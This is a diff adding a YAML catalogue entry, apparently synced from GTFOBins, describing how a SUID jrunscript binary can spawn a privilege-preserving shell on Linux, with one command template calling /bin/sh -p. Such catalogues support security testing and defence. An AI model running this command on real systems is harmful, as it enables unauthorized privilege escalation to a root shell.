@@ -1,0 +1,24 @@
+id: gtfobins/jrunscript/shell/suid
+type: binary
+platform: linux
+name: jrunscript
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'
+references:
+- https://gtfobins.github.io/gtfobins/jrunscript/
+tags:
+- linux
+- unix
+- gtfobins
